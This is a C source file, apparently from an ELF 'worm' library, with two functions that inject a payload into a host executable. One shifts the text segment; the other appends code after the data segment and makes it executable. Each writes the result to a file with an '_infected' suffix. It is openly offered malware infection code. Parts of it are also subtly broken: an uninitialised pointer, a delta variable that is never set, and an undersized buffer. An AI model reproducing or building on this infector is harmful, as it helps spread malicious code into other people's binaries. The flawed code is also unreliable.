//
// Created by ulexec on 16/08/18.
//
#include "worm.h"
#include <sys/mman.h>
#include <stdbool.h>
#include <string.h>


int inject_text_segment(Elfw_Bin *host, void *_target, Elfw_Bin **output_in, bool is_bin, int *payload_offset) {
    struct list_head *iter;
    Elfw_Code *target;
    Elfw_Bin *output;
    uint8_t *output_path;
    int total_size;
    int written_bytes;
    int text_segment_delta;

    if (is_bin) {
        Elfw_Bin *bin = _target;
        target->code = bin->data;
        target->size = bin->size;
    } else {
        target = _target;
    }

    output_path = (uint8_t*)calloc(sizeof(char), strlen(host->path) + strlen("_infected"));
    strncat(output_path, host->path, strlen(host->path));
    strncat(output_path, "_infected", strlen("_infected"));

    total_size =  PAGE_ALIGN_UP(host->size + target->size + DEFAULT_PADDING);
    *payload_offset = sizeof(ElfW(Ehdr));

    if (bin_elf_new(&output, output_path, total_size) == LIBWORM_ERROR) {
        fprintf(stderr, "bin_elf_new Failed\n");
        return LIBWORM_ERROR;
    }
    *output_in = output;
    output->size = total_size;

    if((written_bytes = pwrite(output->fd, host->data, sizeof(ElfW(Ehdr)), 0)) == -1){
        perror("pwrite");
        return LIBWORM_ERROR;
    }

    if (written_bytes != sizeof(ElfW(Ehdr))) {
        fprintf(stderr, "write failed to write expected size: %d", written_bytes);
        return LIBWORM_ERROR;
    }
    output->ehdr = (ElfW(Ehdr) *)output->data;
    output->type = output->ehdr->e_type;
    output->entry = output->ehdr->e_entry;
    output->type = output->ehdr->e_type;
    resolve_sections (output);
    resolve_segments (output);

    BIN_ITER_PHDRS(iter, output) {
        Elfw_Phdr *phdr = GET_LIST_ENTRY(iter, Elfw_Phdr);
        switch(phdr->data->p_type){
            case PT_LOAD:
                if (!phdr->data->p_offset) {
                    phdr->data->p_filesz += text_segment_delta;
                    phdr->data->p_memsz += text_segment_delta;
                    phdr->data->p_vaddr -= text_segment_delta;
                    phdr->data->p_paddr -= text_segment_delta;
                } else {
                    phdr->data->p_offset += text_segment_delta;
                }
                break;
            default:
                phdr->data->p_offset += text_segment_delta;
        }
    }

    BIN_ITER_SHDRS(iter, host) {
        Elfw_Shdr *shdr = GET_LIST_ENTRY(iter, Elfw_Shdr);
        shdr->data->sh_offset += text_segment_delta;
    }

    output->ehdr->e_shoff += text_segment_delta;
    output->ehdr->e_phoff += text_segment_delta;

    bin_update_elf(output, output->data, sizeof(ElfW(Ehdr)));

    if((written_bytes = (int) pwrite(output->fd, target->code, target->size, *payload_offset)) == -1){
        perror("pwrite");
        return LIBWORM_ERROR;
    }

    if (written_bytes != target->size) {
        fprintf(stderr, "write failed to write expected size: %d", written_bytes);
        return LIBWORM_ERROR;
    }

    if((written_bytes = (int) pwrite(output->fd, host->data + sizeof(ElfW(Ehdr)), host->size - sizeof(ElfW(Ehdr)),
            text_segment_delta + sizeof(ElfW(Ehdr)))) == -1){
        perror("pwrite");
        return LIBWORM_ERROR;
    }

    if (written_bytes != host->size - sizeof(ElfW(Ehdr))) {
        fprintf(stderr, "write failed to write expected size: %d", written_bytes);
        return LIBWORM_ERROR;
    }
    resolve_dynamic (output);
    resolve_symbols (output);
    resolve_dynamic_symbols (output);
    resolve_relocs (output);
    resolve_pltgot (output);
    resolve_plt (output);


    bin_update_elf(output, output->size, 0);
    return LIBWORM_SUCCESS;
}



int inject_data_segment(Elfw_Bin *host, void *_target, Elfw_Bin **output_in, bool is_bin, int *payload_offset) {
    struct list_head *iter;
    Elfw_Phdr *data_phdr;
    Elfw_Code *target;
    Elfw_Bin *output;
    uint8_t *output_path;
    int total_size;
    int written_bytes;

    if (is_bin) {
        Elfw_Bin *bin = _target;
        target->code = bin->data;
        target->size = bin->size;
    } else {
        target = _target;
    }

    output_path = (uint8_t*)calloc(sizeof(char), strlen(host->path) + strlen("_infected"));
    strncat(output_path, host->path, strlen(host->path));
    strncat(output_path, "_infected", strlen("_infected"));

    total_size =  PAGE_ALIGN_UP(host->size + target->size);
    *payload_offset = host->size + DEFAULT_PADDING;

    if (bin_elf_new(&output, output_path, total_size) == LIBWORM_ERROR) {
        fprintf(stderr, "bin_elf_new Failed\n");
        return LIBWORM_ERROR;
    }
    *output_in = output;
    output->size = total_size;

    if((written_bytes = pwrite(output->fd, host->data, host->size, 0)) == -1){
        perror("write");
        return LIBWORM_ERROR;
    }

    if (written_bytes != host->size) {
        fprintf(stderr, "write failed to write expected size: %d", written_bytes);
        return LIBWORM_ERROR;
    }

    if((written_bytes = (int) pwrite(output->fd, target->code, target->size, *payload_offset)) == -1){
        perror("pwrite");
        return LIBWORM_ERROR;
    }

    if (written_bytes != target->size) {
        fprintf(stderr, "write failed to write expected size: %d", written_bytes);
        return LIBWORM_ERROR;
    }

    output->ehdr = (ElfW(Ehdr) *)output->data;
    output->type = output->ehdr->e_type;
    output->entry = output->ehdr->e_entry;
    output->type = output->ehdr->e_type;

    resolve_sections (output);
    resolve_segments (output);
    resolve_dynamic (output);
    resolve_symbols (output);
    resolve_dynamic_symbols (output);
    resolve_relocs (output);
    resolve_pltgot (output);
    resolve_plt (output);

    BIN_ITER_PHDRS(iter, output){
        Elfw_Phdr *phdr = GET_LIST_ENTRY(iter, Elfw_Phdr);
        if (phdr->data->p_type == PT_LOAD && phdr->data->p_offset) {
            data_phdr = phdr;
            break;
        }
    }
    size_t size_delta = (host->ehdr->e_shoff + sizeof(ElfW(Shdr)) * host->ehdr->e_shnum) - (data_phdr->data->p_offset);
    data_phdr->data->p_memsz += PAGE_ALIGN_UP(size_delta + target->size);
    data_phdr->data->p_filesz += PAGE_ALIGN_UP(size_delta + target->size);
    data_phdr->data->p_flags |= PF_X;

    bin_update_elf(output, sizeof(ElfW(Ehdr)), 0);
    return LIBWORM_SUCCESS;
}


